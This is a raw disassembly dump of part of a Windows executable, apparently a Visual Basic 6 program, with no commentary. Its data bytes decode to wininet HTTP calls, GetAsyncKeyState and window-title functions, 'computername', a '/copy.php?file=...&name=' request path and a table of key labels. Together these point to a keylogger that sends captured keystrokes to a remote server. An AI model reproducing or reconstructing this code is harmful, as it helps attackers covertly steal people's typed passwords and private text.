  4020f8:	00 00                	add    %al,(%eax)
  4020fa:	00 00                	add    %al,(%eax)
  4020fc:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  402102:	68 10 a7 38 08       	push   $0x838a710
  402107:	00 2b                	add    %ch,(%ebx)
  402109:	33 71 b5             	xor    -0x4b(%ecx),%esi
  40210c:	11 00                	adc    %eax,(%eax)
  40210e:	00 00                	add    %al,(%eax)
  402110:	48                   	dec    %eax
  402111:	74 74                	je     0x402187
  402113:	70 4f                	jo     0x402164
  402115:	70 65                	jo     0x40217c
  402117:	6e                   	outsb  %ds:(%esi),(%dx)
  402118:	52                   	push   %edx
  402119:	65 71 75             	gs jno 0x402191
  40211c:	65 73 74             	gs jae 0x402193
  40211f:	41                   	inc    %ecx
  402120:	00 00                	add    %al,(%eax)
  402122:	00 00                	add    %al,(%eax)
  402124:	43                   	inc    %ebx
  402125:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  402129:	6f                   	outsl  %ds:(%esi),(%dx)
  40212a:	67 72 61             	addr16 jb 0x40218e
  40212d:	6d                   	insl   (%dx),%es:(%edi)
  40212e:	20 46 69             	and    %al,0x69(%esi)
  402131:	6c                   	insb   (%dx),%es:(%edi)
  402132:	65 73 20             	gs jae 0x402155
  402135:	28 78 38             	sub    %bh,0x38(%eax)
  402138:	36 29 5c 4d 69       	sub    %ebx,%ss:0x69(%ebp,%ecx,2)
  40213d:	63 72 6f             	arpl   %esi,0x6f(%edx)
  402140:	73 6f                	jae    0x4021b1
  402142:	66 74 20             	data16 je 0x402165
  402145:	56                   	push   %esi
  402146:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  40214d:	74 75                	je     0x4021c4
  40214f:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  402156:	38 
  402157:	5c                   	pop    %esp
  402158:	56                   	push   %esi
  402159:	42                   	inc    %edx
  40215a:	36 2e 4f             	ss cs dec %edi
  40215d:	4c                   	dec    %esp
  40215e:	42                   	inc    %edx
  40215f:	00 56 42             	add    %dl,0x42(%esi)
  402162:	00 00                	add    %al,(%eax)
  402164:	fc                   	cld
  402165:	20 40 00             	and    %al,0x0(%eax)
  402168:	00 00                	add    %al,(%eax)
  40216a:	00 00                	add    %al,(%eax)
  40216c:	06                   	push   %es
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 09                	add    %cl,(%ecx)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 24 21             	add    %ah,(%ecx,%eiz,1)
  402176:	40                   	inc    %eax
  402177:	00 60 21             	add    %ah,0x21(%eax)
  40217a:	40                   	inc    %eax
  40217b:	00 d0                	add    %dl,%al
  40217d:	72 40                	jb     0x4021bf
	...
  402187:	00 e8                	add    %ch,%al
  402189:	b1 84                	mov    $0x84,%cl
  40218b:	00 da                	add    %bl,%dl
  40218d:	4e                   	dec    %esi
  40218e:	ad                   	lods   %ds:(%esi),%eax
  40218f:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402195:	0c 00                	or     $0x0,%al
  402197:	aa                   	stos   %al,%es:(%edi)
  402198:	00 60 d3             	add    %ah,-0x2d(%eax)
  40219b:	93                   	xchg   %eax,%ebx
  40219c:	6c                   	insb   (%dx),%es:(%edi)
  40219d:	62 6c 44 61          	bound  %ebp,0x61(%esp,%eax,2)
  4021a1:	74 61                	je     0x402204
  4021a3:	00 2a                	add    %ch,(%edx)
  4021a5:	4f                   	dec    %edi
  4021a6:	ad                   	lods   %ds:(%esi),%eax
  4021a7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4021ad:	0c 00                	or     $0x0,%al
  4021af:	aa                   	stos   %al,%es:(%edi)
  4021b0:	00 60 d3             	add    %ah,-0x2d(%eax)
  4021b3:	93                   	xchg   %eax,%ebx
  4021b4:	54                   	push   %esp
  4021b5:	69 6d 65 72 31 00 00 	imul   $0x3172,0x65(%ebp),%ebp
  4021bc:	74 5f                	je     0x40221d
  4021be:	73 61                	jae    0x402221
  4021c0:	76 65                	jbe    0x402227
  4021c2:	00 00                	add    %al,(%eax)
  4021c4:	e2 4e                	loop   0x402214
  4021c6:	ad                   	lods   %ds:(%esi),%eax
  4021c7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4021cd:	0c 00                	or     $0x0,%al
  4021cf:	aa                   	stos   %al,%es:(%edi)
  4021d0:	00 60 d3             	add    %ah,-0x2d(%eax)
  4021d3:	93                   	xchg   %eax,%ebx
  4021d4:	54                   	push   %esp
  4021d5:	65 78 74             	gs js  0x40224c
  4021d8:	31 00                	xor    %eax,(%eax)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	08 00                	or     %al,(%eax)
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	77 69                	ja     0x40224b
  4021e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4021e3:	69 6e 65 74 00 0e 00 	imul   $0xe0074,0x65(%esi),%ebp
  4021ea:	00 00                	add    %al,(%eax)
  4021ec:	49                   	dec    %ecx
  4021ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4021ee:	74 65                	je     0x402255
  4021f0:	72 6e                	jb     0x402260
  4021f2:	65 74 4f             	gs je  0x402244
  4021f5:	70 65                	jo     0x40225c
  4021f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4021f8:	41                   	inc    %ecx
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	00 e0                	add    %ah,%al
  4021fd:	21 40 00             	and    %eax,0x0(%eax)
  402200:	ec                   	in     (%dx),%al
  402201:	21 40 00             	and    %eax,0x0(%eax)
  402204:	00 00                	add    %al,(%eax)
  402206:	04 00                	add    $0x0,%al
  402208:	d4 72                	aam    $0x72
  40220a:	40                   	inc    %eax
	...
  402213:	00 a1 dc 72 40 00    	add    %ah,0x4072dc(%ecx)
  402219:	0b c0                	or     %eax,%eax
  40221b:	74 02                	je     0x40221f
  40221d:	ff e0                	jmp    *%eax
  40221f:	68 fc 21 40 00       	push   $0x4021fc
  402224:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  402229:	ff d0                	call   *%eax
  40222b:	ff e0                	jmp    *%eax
  40222d:	00 00                	add    %al,(%eax)
  40222f:	00 14 00             	add    %dl,(%eax,%eax,1)
  402232:	00 00                	add    %al,(%eax)
  402234:	49                   	dec    %ecx
  402235:	6e                   	outsb  %ds:(%esi),(%dx)
  402236:	74 65                	je     0x40229d
  402238:	72 6e                	jb     0x4022a8
  40223a:	65 74 43             	gs je  0x402280
  40223d:	6c                   	insb   (%dx),%es:(%edi)
  40223e:	6f                   	outsl  %ds:(%esi),(%dx)
  40223f:	73 65                	jae    0x4022a6
  402241:	48                   	dec    %eax
  402242:	61                   	popa
  402243:	6e                   	outsb  %ds:(%esi),(%dx)
  402244:	64 6c                	fs insb (%dx),%es:(%edi)
  402246:	65 00 e0             	gs add %ah,%al
  402249:	21 40 00             	and    %eax,0x0(%eax)
  40224c:	34 22                	xor    $0x22,%al
  40224e:	40                   	inc    %eax
  40224f:	00 00                	add    %al,(%eax)
  402251:	00 04 00             	add    %al,(%eax,%eax,1)
  402254:	e0 72                	loopne 0x4022c8
  402256:	40                   	inc    %eax
	...
  40225f:	00 a1 e8 72 40 00    	add    %ah,0x4072e8(%ecx)
  402265:	0b c0                	or     %eax,%eax
  402267:	74 02                	je     0x40226b
  402269:	ff e0                	jmp    *%eax
  40226b:	68 48 22 40 00       	push   $0x402248
  402270:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  402275:	ff d0                	call   *%eax
  402277:	ff e0                	jmp    *%eax
  402279:	00 00                	add    %al,(%eax)
  40227b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40227e:	00 00                	add    %al,(%eax)
  402280:	77 69                	ja     0x4022eb
  402282:	6e                   	outsb  %ds:(%esi),(%dx)
  402283:	69 6e 65 74 2e 64 6c 	imul   $0x6c642e74,0x65(%esi),%ebp
  40228a:	6c                   	insb   (%dx),%es:(%edi)
  40228b:	00 11                	add    %dl,(%ecx)
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 49 6e             	add    %cl,0x6e(%ecx)
  402292:	74 65                	je     0x4022f9
  402294:	72 6e                	jb     0x402304
  402296:	65 74 43             	gs je  0x4022dc
  402299:	6f                   	outsl  %ds:(%esi),(%dx)
  40229a:	6e                   	outsb  %ds:(%esi),(%dx)
  40229b:	6e                   	outsb  %ds:(%esi),(%dx)
  40229c:	65 63 74 41 00       	arpl   %esi,%gs:0x0(%ecx,%eax,2)
  4022a1:	00 00                	add    %al,(%eax)
  4022a3:	00 80 22 40 00 90    	add    %al,-0x6fffbfde(%eax)
  4022a9:	22 40 00             	and    0x0(%eax),%al
  4022ac:	00 00                	add    %al,(%eax)
  4022ae:	04 00                	add    $0x0,%al
  4022b0:	ec                   	in     (%dx),%al
  4022b1:	72 40                	jb     0x4022f3
	...
  4022bb:	00 a1 f4 72 40 00    	add    %ah,0x4072f4(%ecx)
  4022c1:	0b c0                	or     %eax,%eax
  4022c3:	74 02                	je     0x4022c7
  4022c5:	ff e0                	jmp    *%eax
  4022c7:	68 a4 22 40 00       	push   $0x4022a4
  4022cc:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  4022d1:	ff d0                	call   *%eax
  4022d3:	ff e0                	jmp    *%eax
  4022d5:	00 00                	add    %al,(%eax)
  4022d7:	00 00                	add    %al,(%eax)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	00 80 22 40 00 10    	add    %al,0x10004022(%eax)
  4022e1:	21 40 00             	and    %eax,0x0(%eax)
  4022e4:	00 00                	add    %al,(%eax)
  4022e6:	04 00                	add    $0x0,%al
  4022e8:	f8                   	clc
  4022e9:	72 40                	jb     0x40232b
	...
  4022f3:	00 a1 00 73 40 00    	add    %ah,0x407300(%ecx)
  4022f9:	0b c0                	or     %eax,%eax
  4022fb:	74 02                	je     0x4022ff
  4022fd:	ff e0                	jmp    *%eax
  4022ff:	68 dc 22 40 00       	push   $0x4022dc
  402304:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  402309:	ff d0                	call   *%eax
  40230b:	ff e0                	jmp    *%eax
  40230d:	00 00                	add    %al,(%eax)
  40230f:	00 11                	add    %dl,(%ecx)
  402311:	00 00                	add    %al,(%eax)
  402313:	00 48 74             	add    %cl,0x74(%eax)
  402316:	74 70                	je     0x402388
  402318:	53                   	push   %ebx
  402319:	65 6e                	outsb  %gs:(%esi),(%dx)
  40231b:	64 52                	fs push %edx
  40231d:	65 71 75             	gs jno 0x402395
  402320:	65 73 74             	gs jae 0x402397
  402323:	41                   	inc    %ecx
  402324:	00 00                	add    %al,(%eax)
  402326:	00 00                	add    %al,(%eax)
  402328:	80 22 40             	andb   $0x40,(%edx)
  40232b:	00 14 23             	add    %dl,(%ebx,%eiz,1)
  40232e:	40                   	inc    %eax
  40232f:	00 00                	add    %al,(%eax)
  402331:	00 04 00             	add    %al,(%eax,%eax,1)
  402334:	04 73                	add    $0x73,%al
  402336:	40                   	inc    %eax
	...
  40233f:	00 a1 0c 73 40 00    	add    %ah,0x40730c(%ecx)
  402345:	0b c0                	or     %eax,%eax
  402347:	74 02                	je     0x40234b
  402349:	ff e0                	jmp    *%eax
  40234b:	68 28 23 40 00       	push   $0x402328
  402350:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  402355:	ff d0                	call   *%eax
  402357:	ff e0                	jmp    *%eax
  402359:	00 00                	add    %al,(%eax)
  40235b:	00 07                	add    %al,(%edi)
  40235d:	00 00                	add    %al,(%eax)
  40235f:	00 75 73             	add    %dh,0x73(%ebp)
  402362:	65 72 33             	gs jb  0x402398
  402365:	32 00                	xor    (%eax),%al
  402367:	00 11                	add    %dl,(%ecx)
  402369:	00 00                	add    %al,(%eax)
  40236b:	00 47 65             	add    %al,0x65(%edi)
  40236e:	74 41                	je     0x4023b1
  402370:	73 79                	jae    0x4023eb
  402372:	6e                   	outsb  %ds:(%esi),(%dx)
  402373:	63 4b 65             	arpl   %ecx,0x65(%ebx)
  402376:	79 53                	jns    0x4023cb
  402378:	74 61                	je     0x4023db
  40237a:	74 65                	je     0x4023e1
  40237c:	00 00                	add    %al,(%eax)
  40237e:	00 00                	add    %al,(%eax)
  402380:	60                   	pusha
  402381:	23 40 00             	and    0x0(%eax),%eax
  402384:	6c                   	insb   (%dx),%es:(%edi)
  402385:	23 40 00             	and    0x0(%eax),%eax
  402388:	00 00                	add    %al,(%eax)
  40238a:	04 00                	add    $0x0,%al
  40238c:	10 73 40             	adc    %dh,0x40(%ebx)
	...
  402397:	00 a1 18 73 40 00    	add    %ah,0x407318(%ecx)
  40239d:	0b c0                	or     %eax,%eax
  40239f:	74 02                	je     0x4023a3
  4023a1:	ff e0                	jmp    *%eax
  4023a3:	68 80 23 40 00       	push   $0x402380
  4023a8:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  4023ad:	ff d0                	call   *%eax
  4023af:	ff e0                	jmp    *%eax
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	47                   	inc    %edi
  4023b9:	65 74 46             	gs je  0x402402
  4023bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4023bd:	72 65                	jb     0x402424
  4023bf:	67 72 6f             	addr16 jb 0x402431
  4023c2:	75 6e                	jne    0x402432
  4023c4:	64 57                	fs push %edi
  4023c6:	69 6e 64 6f 77 00 60 	imul   $0x6000776f,0x64(%esi),%ebp
  4023cd:	23 40 00             	and    0x0(%eax),%eax
  4023d0:	b8 23 40 00 00       	mov    $0x4023,%eax
  4023d5:	00 04 00             	add    %al,(%eax,%eax,1)
  4023d8:	1c 73                	sbb    $0x73,%al
  4023da:	40                   	inc    %eax
	...
  4023e3:	00 a1 24 73 40 00    	add    %ah,0x407324(%ecx)
  4023e9:	0b c0                	or     %eax,%eax
  4023eb:	74 02                	je     0x4023ef
  4023ed:	ff e0                	jmp    *%eax
  4023ef:	68 cc 23 40 00       	push   $0x4023cc
  4023f4:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  4023f9:	ff d0                	call   *%eax
  4023fb:	ff e0                	jmp    *%eax
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 0f                	add    %cl,(%edi)
  402401:	00 00                	add    %al,(%eax)
  402403:	00 47 65             	add    %al,0x65(%edi)
  402406:	74 57                	je     0x40245f
  402408:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40240f:	78 74                	js     0x402485
  402411:	41                   	inc    %ecx
  402412:	00 00                	add    %al,(%eax)
  402414:	60                   	pusha
  402415:	23 40 00             	and    0x0(%eax),%eax
  402418:	04 24                	add    $0x24,%al
  40241a:	40                   	inc    %eax
  40241b:	00 00                	add    %al,(%eax)
  40241d:	00 04 00             	add    %al,(%eax,%eax,1)
  402420:	28 73 40             	sub    %dh,0x40(%ebx)
	...
  40242b:	00 a1 30 73 40 00    	add    %ah,0x407330(%ecx)
  402431:	0b c0                	or     %eax,%eax
  402433:	74 02                	je     0x402437
  402435:	ff e0                	jmp    *%eax
  402437:	68 14 24 40 00       	push   $0x402414
  40243c:	b8 b0 11 40 00       	mov    $0x4011b0,%eax
  402441:	ff d0                	call   *%eax
  402443:	ff e0                	jmp    *%eax
  402445:	00 00                	add    %al,(%eax)
  402447:	00 10                	add    %dl,(%eax)
  402449:	00 58 00             	add    %bl,0x0(%eax)
  40244c:	00 00                	add    %al,(%eax)
  40244e:	01 00                	add    %eax,(%eax)
  402450:	00 00                	add    %al,(%eax)
  402452:	00 00                	add    %al,(%eax)
  402454:	38 00                	cmp    %al,(%eax)
  402456:	01 00                	add    %eax,(%eax)
  402458:	23 3d fb fc fa a0    	and    0xa0fafcfb,%edi
  40245e:	68 10 a7 38 08       	push   $0x838a710
  402463:	00 2b                	add    %ch,(%ebx)
  402465:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402468:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  40246e:	68 10 a7 38 08       	push   $0x838a710
  402473:	00 2b                	add    %ch,(%ebx)
  402475:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402478:	02 00                	add    (%eax),%al
  40247a:	00 00                	add    %al,(%eax)
  40247c:	58                   	pop    %eax
  40247d:	24 40                	and    $0x40,%al
  40247f:	00 68 24             	add    %ch,0x24(%eax)
  402482:	40                   	inc    %eax
  402483:	00 00                	add    %al,(%eax)
  402485:	00 00                	add    %al,(%eax)
  402487:	00 79 4f             	add    %bh,0x4f(%ecx)
  40248a:	ad                   	lods   %ds:(%esi),%eax
  40248b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402491:	0c 00                	or     $0x0,%al
  402493:	aa                   	stos   %al,%es:(%edi)
  402494:	00 60 d3             	add    %ah,-0x2d(%eax)
  402497:	93                   	xchg   %eax,%ebx
  402498:	18 00                	sbb    %al,(%eax)
  40249a:	00 00                	add    %al,(%eax)
  40249c:	63 00                	arpl   %eax,(%eax)
  40249e:	6f                   	outsl  %ds:(%esi),(%dx)
  40249f:	00 6d 00             	add    %ch,0x0(%ebp)
  4024a2:	70 00                	jo     0x4024a4
  4024a4:	75 00                	jne    0x4024a6
  4024a6:	74 00                	je     0x4024a8
  4024a8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4024ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4024ad:	00 61 00             	add    %ah,0x0(%ecx)
  4024b0:	6d                   	insl   (%dx),%es:(%edi)
  4024b1:	00 65 00             	add    %ah,0x0(%ebp)
  4024b4:	00 00                	add    %al,(%eax)
  4024b6:	00 00                	add    %al,(%eax)
  4024b8:	e1 4e                	loope  0x402508
  4024ba:	ad                   	lods   %ds:(%esi),%eax
  4024bb:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4024c1:	0c 00                	or     $0x0,%al
  4024c3:	aa                   	stos   %al,%es:(%edi)
  4024c4:	00 60 d3             	add    %ah,-0x2d(%eax)
  4024c7:	93                   	xchg   %eax,%ebx
	...
  4024d0:	06                   	push   %es
  4024d1:	00 00                	add    %al,(%eax)
  4024d3:	00 47 00             	add    %al,0x0(%edi)
  4024d6:	45                   	inc    %ebp
  4024d7:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  4024db:	00 1e                	add    %bl,(%esi)
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	00 2f                	add    %ch,(%edi)
  4024e1:	00 63 00             	add    %ah,0x0(%ebx)
  4024e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e5:	00 70 00             	add    %dh,0x0(%eax)
  4024e8:	79 00                	jns    0x4024ea
  4024ea:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4024ee:	68 00 70 00 3f       	push   $0x3f007000
  4024f3:	00 66 00             	add    %ah,0x0(%esi)
  4024f6:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4024fc:	3d 00 00 00 0c       	cmp    $0xc000000,%eax
  402501:	00 00                	add    %al,(%eax)
  402503:	00 26                	add    %ah,(%esi)
  402505:	00 6e 00             	add    %ch,0x0(%esi)
  402508:	61                   	popa
  402509:	00 6d 00             	add    %ch,0x0(%ebp)
  40250c:	65 00 3d 00 00 00 00 	add    %bh,%gs:0x0
  402513:	00 10                	add    %dl,(%eax)
  402515:	00 00                	add    %al,(%eax)
  402517:	00 48 00             	add    %cl,0x0(%eax)
  40251a:	54                   	push   %esp
  40251b:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40251f:	00 2f                	add    %ch,(%edi)
  402521:	00 31                	add    %dh,(%ecx)
  402523:	00 2e                	add    %ch,(%esi)
  402525:	00 30                	add    %dh,(%eax)
  402527:	00 00                	add    %al,(%eax)
  402529:	00 00                	add    %al,(%eax)
  40252b:	00 12                	add    %dl,(%edx)
  40252d:	00 00                	add    %al,(%eax)
  40252f:	00 5b 00             	add    %bl,0x0(%ebx)
  402532:	20 00                	and    %al,(%eax)
  402534:	49                   	dec    %ecx
  402535:	00 4e 00             	add    %cl,0x0(%esi)
  402538:	56                   	push   %esi
  402539:	00 49 00             	add    %cl,0x0(%ecx)
  40253c:	4f                   	dec    %edi
  40253d:	00 20                	add    %ah,(%eax)
  40253f:	00 5d 00             	add    %bl,0x0(%ebp)
  402542:	00 00                	add    %al,(%eax)
  402544:	04 00                	add    $0x0,%al
  402546:	00 00                	add    %al,(%eax)
  402548:	0d 00 0a 00 00       	or     $0xa00,%eax
  40254d:	00 00                	add    %al,(%eax)
  40254f:	00 02                	add    %al,(%edx)
  402551:	00 00                	add    %al,(%eax)
  402553:	00 30                	add    %dh,(%eax)
  402555:	00 00                	add    %al,(%eax)
  402557:	00 02                	add    %al,(%edx)
  402559:	00 00                	add    %al,(%eax)
  40255b:	00 31                	add    %dh,(%ecx)
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 02                	add    %al,(%edx)
  402561:	00 00                	add    %al,(%eax)
  402563:	00 32                	add    %dh,(%edx)
  402565:	00 00                	add    %al,(%eax)
  402567:	00 02                	add    %al,(%edx)
  402569:	00 00                	add    %al,(%eax)
  40256b:	00 33                	add    %dh,(%ebx)
  40256d:	00 00                	add    %al,(%eax)
  40256f:	00 02                	add    %al,(%edx)
  402571:	00 00                	add    %al,(%eax)
  402573:	00 34 00             	add    %dh,(%eax,%eax,1)
  402576:	00 00                	add    %al,(%eax)
  402578:	02 00                	add    (%eax),%al
  40257a:	00 00                	add    %al,(%eax)
  40257c:	35 00 00 00 02       	xor    $0x2000000,%eax
  402581:	00 00                	add    %al,(%eax)
  402583:	00 36                	add    %dh,(%esi)
  402585:	00 00                	add    %al,(%eax)
  402587:	00 02                	add    %al,(%edx)
  402589:	00 00                	add    %al,(%eax)
  40258b:	00 37                	add    %dh,(%edi)
  40258d:	00 00                	add    %al,(%eax)
  40258f:	00 02                	add    %al,(%edx)
  402591:	00 00                	add    %al,(%eax)
  402593:	00 38                	add    %bh,(%eax)
  402595:	00 00                	add    %al,(%eax)
  402597:	00 02                	add    %al,(%edx)
  402599:	00 00                	add    %al,(%eax)
  40259b:	00 39                	add    %bh,(%ecx)
  40259d:	00 00                	add    %al,(%eax)
  40259f:	00 02                	add    %al,(%edx)
  4025a1:	00 00                	add    %al,(%eax)
  4025a3:	00 2a                	add    %ch,(%edx)
  4025a5:	00 00                	add    %al,(%eax)
  4025a7:	00 02                	add    %al,(%edx)
  4025a9:	00 00                	add    %al,(%eax)
  4025ab:	00 2b                	add    %ch,(%ebx)
  4025ad:	00 00                	add    %al,(%eax)
  4025af:	00 02                	add    %al,(%edx)
  4025b1:	00 00                	add    %al,(%eax)
  4025b3:	00 2d 00 00 00 02    	add    %ch,0x2000000
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	00 2e                	add    %ch,(%esi)
  4025bd:	00 00                	add    %al,(%eax)
  4025bf:	00 02                	add    %al,(%edx)
  4025c1:	00 00                	add    %al,(%eax)
  4025c3:	00 2f                	add    %ch,(%edi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	00 02                	add    %al,(%edx)
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	00 3d 00 00 00 02    	add    %bh,0x2000000
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	00 21                	add    %ah,(%ecx)
  4025d5:	00 00                	add    %al,(%eax)
  4025d7:	00 02                	add    %al,(%edx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	00 22                	add    %ah,(%edx)
  4025dd:	00 00                	add    %al,(%eax)
  4025df:	00 02                	add    %al,(%edx)
  4025e1:	00 00                	add    %al,(%eax)
  4025e3:	00 a3 00 00 00 02    	add    %ah,0x2000000(%ebx)
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	00 24 00             	add    %ah,(%eax,%eax,1)
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	02 00                	add    (%eax),%al
  4025f2:	00 00                	add    %al,(%eax)
  4025f4:	25 00 00 00 02       	and    $0x2000000,%eax
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	00 26                	add    %ah,(%esi)
  4025fd:	00 00                	add    %al,(%eax)
  4025ff:	00 02                	add    %al,(%edx)
  402601:	00 00                	add    %al,(%eax)
  402603:	00 28                	add    %ch,(%eax)
  402605:	00 00                	add    %al,(%eax)
  402607:	00 02                	add    %al,(%edx)
  402609:	00 00                	add    %al,(%eax)
  40260b:	00 29                	add    %ch,(%ecx)
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 00                	add    %al,(%eax)
  402611:	00 00                	add    %al,(%eax)
  402613:	00 08                	add    %cl,(%eax)
  402615:	00 00                	add    %al,(%eax)
  402617:	00 20                	add    %ah,(%eax)
  402619:	00 46 00             	add    %al,0x0(%esi)
  40261c:	31 00                	xor    %eax,(%eax)
  40261e:	20 00                	and    %al,(%eax)
  402620:	00 00                	add    %al,(%eax)
  402622:	00 00                	add    %al,(%eax)
  402624:	08 00                	or     %al,(%eax)
  402626:	00 00                	add    %al,(%eax)
  402628:	20 00                	and    %al,(%eax)
  40262a:	46                   	inc    %esi
  40262b:	00 32                	add    %dh,(%edx)
  40262d:	00 20                	add    %ah,(%eax)
  40262f:	00 00                	add    %al,(%eax)
  402631:	00 00                	add    %al,(%eax)
  402633:	00 08                	add    %cl,(%eax)
  402635:	00 00                	add    %al,(%eax)
  402637:	00 20                	add    %ah,(%eax)
  402639:	00 46 00             	add    %al,0x0(%esi)
  40263c:	33 00                	xor    (%eax),%eax
  40263e:	20 00                	and    %al,(%eax)
  402640:	00 00                	add    %al,(%eax)
  402642:	00 00                	add    %al,(%eax)
  402644:	08 00                	or     %al,(%eax)
  402646:	00 00                	add    %al,(%eax)
  402648:	20 00                	and    %al,(%eax)
  40264a:	46                   	inc    %esi
  40264b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40264e:	20 00                	and    %al,(%eax)
  402650:	00 00                	add    %al,(%eax)
  402652:	00 00                	add    %al,(%eax)
  402654:	08 00                	or     %al,(%eax)
  402656:	00 00                	add    %al,(%eax)
  402658:	20 00                	and    %al,(%eax)
  40265a:	46                   	inc    %esi
  40265b:	00 35 00 20 00 00    	add    %dh,0x2000
  402661:	00 00                	add    %al,(%eax)
  402663:	00 08                	add    %cl,(%eax)
  402665:	00 00                	add    %al,(%eax)
  402667:	00 20                	add    %ah,(%eax)
  402669:	00 46 00             	add    %al,0x0(%esi)
  40266c:	36 00 20             	add    %ah,%ss:(%eax)
  40266f:	00 00                	add    %al,(%eax)
  402671:	00 00                	add    %al,(%eax)
  402673:	00 08                	add    %cl,(%eax)
  402675:	00 00                	add    %al,(%eax)
  402677:	00 20                	add    %ah,(%eax)
  402679:	00 46 00             	add    %al,0x0(%esi)
  40267c:	37                   	aaa
  40267d:	00 20                	add    %ah,(%eax)
  40267f:	00 00                	add    %al,(%eax)
  402681:	00 00                	add    %al,(%eax)
  402683:	00 08                	add    %cl,(%eax)
  402685:	00 00                	add    %al,(%eax)
  402687:	00 20                	add    %ah,(%eax)
  402689:	00 46 00             	add    %al,0x0(%esi)
  40268c:	38 00                	cmp    %al,(%eax)
  40268e:	20 00                	and    %al,(%eax)
  402690:	00 00                	add    %al,(%eax)
  402692:	00 00                	add    %al,(%eax)
  402694:	08 00                	or     %al,(%eax)
  402696:	00 00                	add    %al,(%eax)
  402698:	20 00                	and    %al,(%eax)
  40269a:	46                   	inc    %esi
  40269b:	00 39                	add    %bh,(%ecx)
  40269d:	00 20                	add    %ah,(%eax)
  40269f:	00 00                	add    %al,(%eax)
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	00 0a                	add    %cl,(%edx)
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	00 20                	add    %ah,(%eax)
  4026a9:	00 46 00             	add    %al,0x0(%esi)
  4026ac:	31 00                	xor    %eax,(%eax)
  4026ae:	30 00                	xor    %al,(%eax)
  4026b0:	20 00                	and    %al,(%eax)
  4026b2:	00 00                	add    %al,(%eax)
  4026b4:	0a 00                	or     (%eax),%al
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	20 00                	and    %al,(%eax)
  4026ba:	46                   	inc    %esi
  4026bb:	00 31                	add    %dh,(%ecx)
  4026bd:	00 31                	add    %dh,(%ecx)
  4026bf:	00 20                	add    %ah,(%eax)
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	00 0a                	add    %cl,(%edx)
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	00 20                	add    %ah,(%eax)
  4026c9:	00 46 00             	add    %al,0x0(%esi)
  4026cc:	31 00                	xor    %eax,(%eax)
  4026ce:	32 00                	xor    (%eax),%al
  4026d0:	20 00                	and    %al,(%eax)
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	02 00                	add    (%eax),%al
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	7c 00                	jl     0x4026da
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	02 00                	add    (%eax),%al
  4026de:	00 00                	add    %al,(%eax)
  4026e0:	5c                   	pop    %esp
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 02                	add    %al,(%edx)
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	00 3b                	add    %bh,(%ebx)
  4026e9:	00 00                	add    %al,(%eax)
  4026eb:	00 02                	add    %al,(%edx)
  4026ed:	00 00                	add    %al,(%eax)
  4026ef:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4026f2:	00 00                	add    %al,(%eax)
  4026f4:	02 00                	add    (%eax),%al
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	5f                   	pop    %edi
